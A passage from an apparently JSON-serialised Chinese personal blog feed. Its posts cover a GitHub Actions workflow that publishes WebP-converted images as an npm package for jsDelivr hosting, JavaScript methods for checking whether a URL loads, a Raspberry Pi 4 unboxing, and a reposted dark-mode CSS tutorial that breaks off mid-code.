src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span 